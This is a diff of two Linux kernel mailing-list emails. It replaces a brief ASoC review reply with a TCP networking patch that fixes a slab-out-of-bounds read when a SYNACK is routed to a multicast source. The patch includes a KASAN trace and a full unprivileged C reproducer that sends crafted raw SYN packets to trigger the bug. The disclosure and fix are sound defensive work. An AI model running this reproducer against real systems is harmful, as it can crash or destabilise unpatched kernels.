@@ -1,177 +1,295 @@
-Received: from mx0a-0031df01.pphosted.com (mx0a-0031df01.pphosted.com [205.220.168.131])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-ej1-f53.google.com (mail-ej1-f53.google.com [209.85.218.53])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5397A469828
-	for <linux-kernel@vger.kernel.org>; Thu,  8 Oct 2026 11:51:01 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=205.220.168.131
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 97F63484237
+	for <linux-kernel@vger.kernel.org>; Thu,  8 Oct 2026 11:51:40 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.218.53
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1791460262; cv=none; b=BmWTob3mAiDfer1NcZV0tqCeWLLfKdc+BfpTdDhCGh0GDSdfso8L1OeBp+cUkRdAsFFtn5b7oe4LiXKGgRFpbyeCcEjFWFqZaUo/uW2nAOZupEM/5uGp4a2BBGr25jv9/w9xdhBMfXe7sgrwNNDveoLWJ9MQcEnk8c58rZgjGmM=
+	t=1791460302; cv=none; b=OVgfao/i1BaiHA5et0TdKhS13kApBqpfeVi8kDkumYD1V107PfzENnyrj9Y77q5s0BrWLL2Vly6gauE9XMxoB+1wO23FKXTOuYXYwtSZMI3/NCnMYg0XZgOO3QI4E0tLnGrlokTY0QaJNnAMxWKqwSgMVbMkSmS79+iygvPhwYM=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1791460262; c=relaxed/simple;
-	bh=zEBx508/RQcpNMZV46M+QMsQvaYOL2nukMD6OutAkt0=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=qPMVbSjkflPTPVvjMe0sxD4McPDOtBLbjQVsJpdKjAqBaOBbc3tG8LroN8Ig1zeT/iLgrG2vGikoPVZnv/pRZyrQjOVgnuIkDeAPnn+igRkH9vARnQlN1HULD8nYko4g0oZNni9LqngpcRU2qMs1qDKbSyAZ+F1JbfhdMsJ1/bo=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=oss.qualcomm.com; spf=pass smtp.mailfrom=oss.qualcomm.com; dkim=pass (2048-bit key) header.d=qualcomm.com header.i=@qualcomm.com header.b=fUcqI1O/; dkim=pass (2048-bit key) header.d=oss.qualcomm.com header.i=@oss.qualcomm.com header.b=YxPYgFtv; arc=none smtp.client-ip=205.220.168.131
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=oss.qualcomm.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=oss.qualcomm.com
+	s=arc-20240116; t=1791460302; c=relaxed/simple;
+	bh=HKYesztoZud9Nk3d36K4QAwPUgNiD8VsgAIOJLZJMwI=;
+	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=vDScnp7thCdYOtEWaHS847kzlPqrlmBWp+T6SE4U81Srv467EGBI7PF7vv7I/BOwRGLRtaq3DYnG8cBvc/fB30nNIPAqIvwnTbtZE3wd4Btc1amNPo9XftCfmEzTAAaKYKbziaKrqD5uFg66juaNlFKjuuBQhYZPsRDoTEPJCp0=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=YMeuYeoI; arc=none smtp.client-ip=209.85.218.53
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=qualcomm.com header.i=@qualcomm.com header.b="fUcqI1O/";
-	dkim=pass (2048-bit key) header.d=oss.qualcomm.com header.i=@oss.qualcomm.com header.b="YxPYgFtv"
-Received: from pps.filterd (m0279867.ppops.net [127.0.0.1])
-	by mx0a-0031df01.pphosted.com (8.18.1.11/8.18.1.11) with ESMTP id 698BJwlj3846907
-	for <linux-kernel@vger.kernel.org>; Thu, 8 Oct 2026 11:51:00 GMT
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualcomm.com; h=
-	cc:content-transfer-encoding:content-type:date:from:in-reply-to
-	:message-id:mime-version:references:subject:to; s=qcppdkim1; bh=
-	dERFh+6tgQKI7QA2ghVyFA6Snc4VzECI2TsSXb2K9k4=; b=fUcqI1O/4rl7SyIx
-	NhvkJS+F42bLnU8/JqymQMwotM2ZGA3Bv3GJEabhst0ap0I9ZyiPdqo9RwxmsHAf
-	RG1uyKqBvm9IJ31XbftFhTJFYMKMkn+KUSIzZkoI5sO8LEA4z9hoEJ0haBXRMI65
-	bWQSqIBFcPYKU7+6ZwX6R4mThDR5kBs9FzWRo+uVyj9gKJ+tdnR91G9OfVXCEeOp
-	ULj264Da5qCYqdSWVE2iHUc/9Rs2p2SraB2dlfw/pV0O48FI2hiV/nkBF5A2rQnF
-	ddYbUzLNV+A5+uKm3P0EAs8NEG6Bp4voHyTEjunTlkbHW5apV7keHZzMwt46ZBSn
-	tvN34g==
-Received: from mail-pg1-f200.google.com (mail-pg1-f200.google.com [209.85.215.200])
-	by mx0a-0031df01.pphosted.com (PPS) with ESMTPS id 4h60sgaaeb-1
-	(version=TLSv1.3 cipher=TLS_AES_128_GCM_SHA256 bits=128 verify=NOT)
-	for <linux-kernel@vger.kernel.org>; Thu, 08 Oct 2026 11:51:00 +0000 (GMT)
-Received: by mail-pg1-f200.google.com with SMTP id 41be03b00d2f7-cc73895c7d5so5997800a12.1
-        for <linux-kernel@vger.kernel.org>; Thu, 08 Oct 2026 04:51:00 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="YMeuYeoI"
+Received: by mail-ej1-f53.google.com with SMTP id a640c23a62f3a-c2e2db5e8e4so853417666b.0
+        for <linux-kernel@vger.kernel.org>; Thu, 08 Oct 2026 04:51:40 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=oss.qualcomm.com; s=google; t=1791460260; x=1792065060; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:in-reply-to:from
-         :content-language:references:cc:to:subject:user-agent:mime-version
-         :date:message-id:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=dERFh+6tgQKI7QA2ghVyFA6Snc4VzECI2TsSXb2K9k4=;
-        b=YxPYgFtvDbyCOAwPj2J9LACOqxcvbiUE7L7xOb1P/HN0Y9OYIu8j0g3IQ2SQ1O9suD
-         TjfCiWRnLh/VFOfD+g6op5lwDmGS1S/bIB+X4JvwrC8f2feRi/nNSrp4xP1fFltCYxZo
-         n4JESmRxEcysx7cX9lSHmj43omLtxlyNuX3zB1MZkNIOQcxiGAfFGrtUyj2HQfuxXzVa
-         MUtMdeGRsa7oHiLLWOPhaV6hFFPC9LMuQbHqADfqY/qyqPzFl5PfatBEwk64hav/oaXM
-         c4Org2n7eXOvg98VFzQgt0Rsv6YyRhSJwQnmps7YmD1YH1d5zVxuo5DWQODUEhOQd76l
-         5diA==
+        d=gmail.com; s=20251104; t=1791460299; x=1792065099; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=H+FDGOW/u+KiRKHRknQe57Swy2AN4nRD52/L+SlCLfc=;
+        b=YMeuYeoInZcBSHfWk8hPKxDhlvBOb4KTPc3NlSFc0UCVZE6CHkdmwLavNvcATuqcvQ
+         i8i4JxKqefJzJSgASNAmxQ2pCVDjoYVG8HhLOnZ5Kb1y3bXN4ldXP7W9PP8Cw5NzEEcX
+         jjolPbbqAhZX/NGD7ep9fKJtk66o8Ke6q3MzQSBEeoae7iQ2RKCBUDAU8bs9jZ5y5HHU
+         kG+ZtRwEswVrQnFjisImEOUToeJmngrsPIW91oRtZv6coKm/4KHOlTjUX0qxZ9AUBs/Z
+         sJNlO+23XuowmbhZLA8vdHFQYTQXWZdFXlTK/zzoZH6ohia0Ju220V0TzEaNOcVam5Ku
+         xHWQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1791460260; x=1792065060;
-        h=content-transfer-encoding:content-type:in-reply-to:from
-         :content-language:references:cc:to:subject:user-agent:mime-version
-         :date:message-id:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=1e100.net; s=20260707; t=1791460299; x=1792065099;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=dERFh+6tgQKI7QA2ghVyFA6Snc4VzECI2TsSXb2K9k4=;
-        b=Qv+iqPk7Ll+NHPvnNjCLfpzwUr/bCh6k6g7kPe8quAZNkWbuESEzbVNtQs4iQZVSIF
-         ZFbVKY8uUUaV/rAu7kE9EpEdRE0DW7iGwesIaFxYWJz6G2D9S1A6P7OUgOm0L0KevtVR
-         Hfk9hn2670w0aRuVbQQKklYbd78INJmBi5EjQ6PUb6bVJIzjgE5Dx0Gay0spMVBEtn/G
-         Iz8IyRTHYe+gQz5+nLzlPD3LIJlBNmQ7HOm8x5bF3I8klfUI0BHN++iDAItTMoBuvAEL
-         Zmql4Js8YMiOfocXA/oTzRK/n+k8q5TJdKZ3Dx6Y5lXo/2JPL3ZKlp8pDXLgd+N96fdE
-         9kEg==
-X-Forwarded-Encrypted: i=1; AKwUvByAxCtj6tCIW9Otn2Fkl7XO8w5CopWL0HuQAOLXyq3IBwU6wsEbrEtVYkBhpRO/ZTRXU7laFWqr5lcJtqk=@vger.kernel.org
-X-Gm-Message-State: AFq9FYKd0G1Ne0KaWB9limJMgl0zzR/yu7tGicg1UNRYmJdDTKjcf8IY
-	TmslGv8DJd/jsSpYSSHzuYDsRRBygfO54U4jzo33Fkn7o0xoYcN2ghZtz444zPwa4u3LEog6nre
-	47FV6TQKK6K0SkjHW4wHS51GfALnqgZQIFcHYQZgL7ND0gFzwx7J7V3VaPQrR0XetsPo=
-X-Gm-Gg: AYBFou18aQnw1CgL/1Whg/KIg9vl/1RWGFoG3c0ffyJQY8GvaquCQpSMHxLJE2vNQ4f
-	1FPSZj+J+j2ZIOGF2pgwikdHH6v66BZXTRQzJXvOpIcrSGrGVeuqqQAOsB2hpksewayUtu6H8IS
-	ud6fg1NeU9IU0ZWmkbu3khXoejmr4jfPX0b3T4q3/P38X27FE9Krg8qkF85yNz7xIeajGm+y/CM
-	TgQuqYxR7Xv/NHmmhWIvpe5KGdsx7SCNrtZR0b/Hjjl+4HpnYoVW5UjK1ImLNsMd7J30ckvFq8p
-	CTRYsZUqMjfg5zesmlwbOyNIciE8Zy9JK3dBvNJHPyVCQiTcqIgK2b7mI3O7MZ+kRmzleaXVzcj
-	1bPIgaBH+qetcuqTZgi+rEltNxMY=
-X-Received: by 2002:a17:90b:3946:b0:3ab:1b19:78f4 with SMTP id 98e67ed59e1d1-3ab1b1979d8mr232236a91.6.1791460259594;
-        Thu, 08 Oct 2026 04:50:59 -0700 (PDT)
-X-Received: by 2002:a17:90b:3946:b0:3ab:1b19:78f4 with SMTP id 98e67ed59e1d1-3ab1b1979d8mr232209a91.6.1791460259138;
-        Thu, 08 Oct 2026 04:50:59 -0700 (PDT)
-Received: from [10.218.18.193] ([202.46.22.19])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a9ff817537sm3864991a91.8.2026.10.08.04.50.53
-        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
-        Thu, 08 Oct 2026 04:50:58 -0700 (PDT)
-Message-ID: <eb3bb86d-3d73-4dad-8041-8d8e26c2cd21@oss.qualcomm.com>
-Date: Thu, 8 Oct 2026 17:20:52 +0530
+        bh=H+FDGOW/u+KiRKHRknQe57Swy2AN4nRD52/L+SlCLfc=;
+        b=UQxOL8rLeNXrqFzFZRUKzRw8qA6W+aGZKx6udxEu3upxXSTpRpFOzl65LVa8XV1PDm
+         DJlmOhhn16agqhQ6O1ClRL4/bAYhWFEQWyRuzx6YrkM6Q+Ju/QCtQl8zYwndM6NQpGCZ
+         9F8Ma7EpbV4pqlSbGHZ8QUXyhViDYAzEg6TSM4PXDyZVAiEI96cMSRjJ85BdW9Xx5X8X
+         3rRALOnDx4oT3ovvOU+AegwLCDv5n4/w70tmePLisY7iUC3Gt2UyeupgrbTxITLhWnku
+         ZHtuK4xDFpDbGs8ysqRUcafF2LuaqwwXJ6y1UNxK9xJfmbEv9wKQ8a2JK+0f4hThSmKq
+         D/6g==
+X-Forwarded-Encrypted: i=1; AKwUvBw9XE24YU2cOTjS4dmjhuTh9IUHsRMBB7Y87wbH6pXIkshnRlZMs5Di0DV7FUmjs9BeBS/KYeKBAIhJ92w=@vger.kernel.org
+X-Gm-Message-State: AFuF++mfGyajIicrecPAKfwkp+IUH0AtIY6C9qNu7MZd+VY6svu4BcOS
+	YeJAxTQz0iZ8Vu5kB43bAuN49k2a5HmS/zEz7USilYbaQt770TDZyog8
+X-Gm-Gg: AYBFou1CfQB28SONn6VyqapIjd26cqnoKAOUfs3MEt66koxpyJK3sX/RPxRVAGaNQ+W
+	tSkN9ErCSocwjqLtXU5MzR5+PnsxRxeZff0nhPb45wPbGY/0pbrZeWbX7yCnxBukx9guOITnd8p
+	gdZPfZ1QhNUF3BwqqUxq3JeFrPD0cexDsLKOilS9XGemEBM4uQyVcmmsQFfH6Oz1CDG3NYQNeG8
+	VgwMnQSOc4jW8epO5woAWDJ3s+A3PCnM3gDfrbBu6fgkiai2SAW6VqThBkIdFEYSi/xaJdwJWcP
+	J362xPyxtHSomlW9i08pmcwuo5BKsqii0M0r88BJjhv9NTclMT2Rz81XMuosPDRzHP3zFCumtKU
+	UX+pjb4CaEJXMzwfQ+2Fd5r4f9NE4IZBzSQHXv7a4zzX9/Dm2CgceeppiDpUqbVJKdRxx3kLBSy
+	I8AuBYhrAO8OY6Xl/guO6+y3p0iJicS9LCFANcKwdok/4pYUHgXcGKUk9lXbBDgzuNYjnN1G2SW
+	LpR+NzEsd9X/CmoNxfhAw==
+X-Received: by 2002:a17:907:3da8:b0:c2e:3d17:5259 with SMTP id a640c23a62f3a-c317c132f17mr525725166b.41.1791460298499;
+        Thu, 08 Oct 2026 04:51:38 -0700 (PDT)
+Received: from theodors-laptop.. ([5.255.118.7])
+        by smtp.gmail.com with ESMTPSA id a640c23a62f3a-c317c2fcf7fsm209626166b.51.2026.10.08.04.51.36
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Thu, 08 Oct 2026 04:51:37 -0700 (PDT)
+From: Theodor Arsenij Larionov Trichkine <theodorlarionov@gmail.com>
+To: edumazet@kernel.org,
+	ncardwell@google.com,
+	kuniyu@google.com,
+	davem@davemloft.net,
+	kuba@kernel.org,
+	pabeni@redhat.com
+Cc: horms@kernel.org,
+	netdev@vger.kernel.org,
+	linux-kernel@vger.kernel.org,
+	Theodor Arsenij Larionov Trichkine <theodorlarionov@gmail.com>
+Subject: [PATCH net v2] tcp: do not send a SYNACK to a broadcast or multicast address
+Date: Thu,  8 Oct 2026 14:49:42 +0300
+Message-Id: <20261008114942.1376889-1-theodorlarionov@gmail.com>
+X-Mailer: git-send-email 2.34.1
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH v2 09/14] ASoC: mediatek: mt8195: Propagate IRQ lookup
- errors
-To: phucduc.bui@gmail.com, Mark Brown <broonie@kernel.org>,
-        AngeloGioacchino Del Regno <angelogioacchino.delregno@collabora.com>,
-        Trevor Wu <trevor.wu@mediatek.com>
-Cc: Liam Girdwood <lgirdwood@gmail.com>,
-        Matthias Brugger <matthias.bgg@gmail.com>,
-        Jaroslav Kysela <perex@perex.cz>, Takashi Iwai <tiwai@suse.com>,
-        Kuninori Morimoto <kuninori.morimoto.gx@renesas.com>,
-        cassiogabrielcontato@gmail.com,
-        Mukesh Ojha <mukesh.ojha@oss.qualcomm.com>,
-        Liviu Dudau <liviu.dudau@arm.com>, Haotian Zhang <vulab@iscas.ac.cn>,
-        HariKrishna Sagala <hariconscious@gmail.com>,
-        linux-sound@vger.kernel.org, linux-arm-kernel@lists.infradead.org,
-        linux-mediatek@lists.infradead.org, linux-kernel@vger.kernel.org
-References: <20261005110257.50145-1-phucduc.bui@gmail.com>
- <20261005110257.50145-10-phucduc.bui@gmail.com>
-Content-Language: en-US
-From: Ajay Kumar Nandam <ajay.nandam@oss.qualcomm.com>
-In-Reply-To: <20261005110257.50145-10-phucduc.bui@gmail.com>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 7bit
-X-Proofpoint-GUID: 8qQ2NMrg6cTqMBuFALDbVC_hA5Ksn_ng
-X-Proofpoint-Spam-Info: AW1haW4tMjYxMDA4MDA0NyBTYWx0ZWRfX14wV+K7ObbTy
- Ql7YbxqOHKpsyEwE5rkkSwxSp8cpQM3bpYzaQIoMiMatieFCujuFnPLDuZfNZ5Hog/jxA7rJwyk
- uURPiOXvaIpkZRBHcy2yj941zE6hZKE=
-X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYxMDA4MDA0NyBTYWx0ZWRfX/ZZuks/0+i0D
- 9dc/e3qyOg1LRE+7prozGnlhNqm1sIo8xp/9ysnctUHRG5+mJ9c4hlNwoTdoLSi5BeUcBHEC/o5
- hQKUFNwf5vbAmUEhOADbrbhmBGHe6tlX5CO2n2FBql3P8oktok0xHuncIHcel54ajse+z5nKR1A
- 1kB/1tmSxPQAAQ7luDNtpu6mRy5plNMIJ6fU194V75iNcpZwLCxDVCePJMt1m6RQ9ylCrTc6XZk
- bu5Ef/7E6J1UVkz4vQADkBv0XIh3f+q9+y9s9VpH9rKJCyEGQePT1a/xcYqHbG3pjnvQbgPKDQK
- KcxfRNo4K3g3ft6qZryiMXvSRZ97k/x8OKcrikZu/FS9Igp6U+lBYL/OAGpvTy/26R7yYCjlHuk
- Ac31fGkj44eR/yKXtRZ/ZrayXHXFqJYXTe1ZcIzYjCIrcM4FAlDj3xptu21u0S8V/xr7FwASCBJ
- caHkZManX2PQcpS0cEw==
-X-Authority-Analysis: v=2.4 cv=DfWCOftW c=1 sm=1 tr=0 ts=6ac783a4 cx=c_pps
- a=oF/VQ+ItUULfLr/lQ2/icg==:117 a=fChuTYTh2wq5r3m49p7fHw==:17
- a=IkcTkHD0fZMA:10 a=660iZSQnnn4A:10 a=s4-Qcg_JpJYA:10
- a=VkNPw1HP01LnGYTKEx00:22 a=u7WPNUs3qKkmUXheDGA7:22 a=eoimf2acIAo5FJnRuUoq:22
- a=pGLkceISAAAA:8 a=EUspDBNiAAAA:8 a=fkDIAU-C-wBUwbiI5OYA:9 a=QEXdDO2ut3YA:10
- a=3WC7DwWrALyhR5TkjVHa:22
-X-Proofpoint-ORIG-GUID: 8qQ2NMrg6cTqMBuFALDbVC_hA5Ksn_ng
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1176,Hydra:6.1.134,FMLib:17.12.100.49
- definitions=2026-10-08_04,2026-10-08_01,2025-10-01_01
-X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0
- lowpriorityscore=0 malwarescore=0 bulkscore=0 phishscore=0 clxscore=1015
- priorityscore=1501 suspectscore=0 spamscore=0 impostorscore=0 adultscore=0
- classifier=typeunknown authscore=0 authtc= authcc= route=outbound adjust=0
- reason=mlx scancount=1 engine=8.22.0-2610020000 definitions=main-2610080047
+Content-Transfer-Encoding: 8bit
 
+tcp_v4_conn_request() drops a SYN sent to a broadcast or multicast
+address. The SYNACK route has no such check. A SYN with a multicast
+source address can reach a listener when it is looped back with its
+dst attached: ip_rcv_finish_core() then skips ip_route_input_noref()
+and its martian source check. A raw IP_HDRINCL socket sending to a
+local address does this, as does re-injection by nft dup or the
+iptables TEE target.
 
+If the SYN destination is an address on a non-loopback device and the
+source is a group joined there (such as 224.0.0.1), the SYNACK route
+has RTCF_MULTICAST and RTCF_LOCAL set, and ip_build_and_send_pkt()
+sends it through ip_mc_output(). skb->sk of a SYNACK is the request
+socket, so sk_mc_loop() reads inet_flags past the end of it:
 
-On 10/5/2026 4:32 PM, phucduc.bui@gmail.com wrote:
-> From: bui duc phuc <phucduc.bui@gmail.com>
-> 
-> Propagate the error returned by platform_get_irq() instead of
-> replacing it with -ENXIO.
-> 
-> This preserves errors such as -EPROBE_DEFER for proper handling
-> by the caller.
-> 
-> Fixes: 6746cc858259 ("ASoC: mediatek: mt8195: add platform driver")
-> Signed-off-by: bui duc phuc <phucduc.bui@gmail.com>
+BUG: KASAN: slab-out-of-bounds in sk_mc_loop+0x111/0x170
+Read of size 8 at addr ffff88800f2b7f10 by task repro-raw/470
+Call Trace:
+ <IRQ>
+ sk_mc_loop+0x111/0x170
+ ip_mc_output+0x355/0x930
+ ip_build_and_send_pkt+0xb87/0xc50
+ tcp_v4_send_synack+0x500/0x6f0
+ tcp_conn_request+0x2135/0x2d90
+ tcp_v4_conn_request+0xa5/0x210
+ tcp_rcv_state_process+0x136e/0x6920
+ tcp_v4_do_rcv+0x339/0xb10
+ tcp_v4_rcv+0x34ab/0x3ab0
+ ip_protocol_deliver_rcu+0x6e/0x3e0
+ ip_local_deliver_finish+0x34d/0x510
+ ip_local_deliver+0x1bc/0x310
+ ip_rcv+0x390/0x410
+ __netif_receive_skb_one_core+0x199/0x1e0
+ process_backlog+0x239/0x680
+ __napi_poll+0xb5/0x650
+ net_rx_action+0x980/0xd60
+ handle_softirqs+0x17f/0x590
+ do_softirq+0x3f/0x60
+ </IRQ>
+ <TASK>
+ __local_bh_enable_ip+0x66/0x80
+ __dev_queue_xmit+0xa65/0x3520
+ ip_finish_output2+0xb00/0x16f0
+ ip_output+0x2ad/0x4a0
+ raw_sendmsg+0x245b/0x28e0
+ inet_sendmsg+0x121/0x150
+ __sys_sendto+0x450/0x4e0
+ do_syscall_64+0xf6/0x500
+ </TASK>
 
-LGTM
+Allocated by task 470:
+ inet_reqsk_alloc+0x97/0x6f0
+ tcp_conn_request+0x4c6/0x2d90
+ tcp_v4_conn_request+0xa5/0x210
 
-Reviewed-by: Ajay Kumar Nandam <ajay.nandam@oss.qualcomm.com>
+The buggy address belongs to the object at ffff88800f2b7d60
+ which belongs to the cache request_sock_TCP of size 312
+The buggy address is located 120 bytes to the right of
+ allocated 312-byte region [ffff88800f2b7d60, ffff88800f2b7e98)
 
-> ---
->   sound/soc/mediatek/mt8195/mt8195-afe-pcm.c | 2 +-
->   1 file changed, 1 insertion(+), 1 deletion(-)
-> 
-> diff --git a/sound/soc/mediatek/mt8195/mt8195-afe-pcm.c b/sound/soc/mediatek/mt8195/mt8195-afe-pcm.c
-> index 1bca2f62e76e..4ddf2114a1ab 100644
-> --- a/sound/soc/mediatek/mt8195/mt8195-afe-pcm.c
-> +++ b/sound/soc/mediatek/mt8195/mt8195-afe-pcm.c
-> @@ -3125,7 +3125,7 @@ static int mt8195_afe_pcm_dev_probe(struct platform_device *pdev)
->   	/* request irq */
->   	irq_id = platform_get_irq(pdev, 0);
->   	if (irq_id < 0)
-> -		return -ENXIO;
-> +		return irq_id;
->   
->   	ret = devm_request_irq(dev, irq_id, mt8195_afe_irq_handler,
->   			       IRQF_TRIGGER_NONE, "asys-isr", (void *)afe);
+Apply the same check to the SYNACK route in inet_csk_route_req().
+
+Fixes: ca6fb0651883 ("tcp: attach SYNACK messages to request sockets instead of listener")
+Suggested-by: Eric Dumazet <edumazet@kernel.org>
+Signed-off-by: Theodor Arsenij Larionov Trichkine <theodorlarionov@gmail.com>
+---
+v2:
+- Reject broadcast/multicast SYNACK routes in inet_csk_route_req() (Eric Dumazet).
+- Describe how the SYN reaches the listener; add KASAN splat and repro.
+v1: https://lore.kernel.org/netdev/20261008100423.1256884-1-theodorlarionov@gmail.com/
+
+Reproducer (unprivileged, user + network namespace):
+
+// gcc -O2 -static -o repro repro.c && ./repro
+#define _GNU_SOURCE
+#include <arpa/inet.h>
+#include <fcntl.h>
+#include <netinet/in.h>
+#include <sched.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+#define LOCAL_ADDR "10.0.0.1"	/* address of dummy0 */
+#define MCAST_SRC  "224.0.0.1"	/* all-hosts, joined on every interface */
+#define PORT       20000
+
+static void die(const char *m) { perror(m); exit(1); }
+
+static void wr(const char *path, const char *buf)
+{
+	int fd = open(path, O_WRONLY);
+
+	if (fd < 0 || write(fd, buf, strlen(buf)) < 0)
+		die(path);
+	close(fd);
+}
+
+static void run(const char *cmd)
+{
+	if (system(cmd))
+		fprintf(stderr, "failed: %s\n", cmd);
+}
+
+static uint16_t csum(const uint8_t *p, int len)
+{
+	uint32_t s = 0;
+	int i;
+
+	for (i = 0; i + 1 < len; i += 2)
+		s += (p[i] << 8) | p[i + 1];
+	if (i < len)
+		s += p[i] << 8;
+	while (s >> 16)
+		s = (s & 0xffff) + (s >> 16);
+	return ~s;
+}
+
+int main(void)
+{
+	char map[64];
+	int uid = getuid(), gid = getgid();
+
+	if (unshare(CLONE_NEWUSER | CLONE_NEWNET))
+		die("unshare");
+	wr("/proc/self/setgroups", "deny");
+	snprintf(map, sizeof(map), "0 %d 1", uid);
+	wr("/proc/self/uid_map", map);
+	snprintf(map, sizeof(map), "0 %d 1", gid);
+	wr("/proc/self/gid_map", map);
+
+	run("ip link set lo up");
+	run("ip link add dummy0 type dummy");
+	run("ip addr add " LOCAL_ADDR "/24 dev dummy0");
+	run("ip link set dummy0 up");
+
+	int l = socket(AF_INET, SOCK_STREAM, 0);
+	struct sockaddr_in a = {
+		.sin_family = AF_INET,
+		.sin_port = htons(PORT),
+	};
+	if (l < 0 || bind(l, (struct sockaddr *)&a, sizeof(a)) || listen(l, 128))
+		die("listen");
+
+	int raw = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+	if (raw < 0)
+		die("raw socket");
+
+	uint8_t pkt[40] = { 0 }, ph[32];
+	uint32_t saddr = inet_addr(MCAST_SRC), daddr = inet_addr(LOCAL_ADDR);
+
+	pkt[0] = 0x45;			/* IPv4, ihl 5 */
+	pkt[3] = sizeof(pkt);		/* tot_len */
+	pkt[8] = 64;			/* ttl */
+	pkt[9] = IPPROTO_TCP;
+	memcpy(pkt + 12, &saddr, 4);
+	memcpy(pkt + 16, &daddr, 4);
+	pkt[22] = PORT >> 8;		/* dport */
+	pkt[23] = PORT & 0xff;
+	pkt[32] = 5 << 4;		/* doff */
+	pkt[33] = 0x02;			/* SYN */
+	pkt[34] = 0x40;			/* window */
+
+	for (int i = 0; i < 100; i++) {
+		uint16_t c, sport = 10000 + i;
+		struct sockaddr_in to = {
+			.sin_family = AF_INET,
+			.sin_addr.s_addr = daddr,
+		};
+
+		pkt[20] = sport >> 8;
+		pkt[21] = sport & 0xff;
+		pkt[36] = pkt[37] = 0;
+		memcpy(ph, pkt + 12, 8);	/* pseudo header */
+		ph[8] = 0;
+		ph[9] = IPPROTO_TCP;
+		ph[10] = 0;
+		ph[11] = 20;
+		memcpy(ph + 12, pkt + 20, 20);
+		c = csum(ph, sizeof(ph));
+		pkt[36] = c >> 8;
+		pkt[37] = c & 0xff;
+		if (sendto(raw, pkt, sizeof(pkt), 0, (struct sockaddr *)&to, sizeof(to)) < 0)
+			die("sendto");
+	}
+	sleep(1);
+	return 0;
+}
+
+ net/ipv4/inet_connection_sock.c | 3 +++
+ 1 file changed, 3 insertions(+)
+
+diff --git a/net/ipv4/inet_connection_sock.c b/net/ipv4/inet_connection_sock.c
+index 6a30f1138454..aa928015cd14 100644
+--- a/net/ipv4/inet_connection_sock.c
++++ b/net/ipv4/inet_connection_sock.c
+@@ -779,6 +779,9 @@ struct dst_entry *inet_csk_route_req(const struct sock *sk,
+ 		goto no_route;
+ 	if (opt && opt->opt.is_strictroute && rt->rt_uses_gateway)
+ 		goto route_err;
++	/* Never send a SYNACK to a broadcast or multicast destination. */
++	if (rt->rt_flags & (RTCF_BROADCAST | RTCF_MULTICAST))
++		goto route_err;
+ 	rcu_read_unlock();
+ 	return &rt->dst;
+ 
+
+base-commit: 6d25ffca055a77787c21a36b66c253f76239411b
+-- 
+2.34.1
 
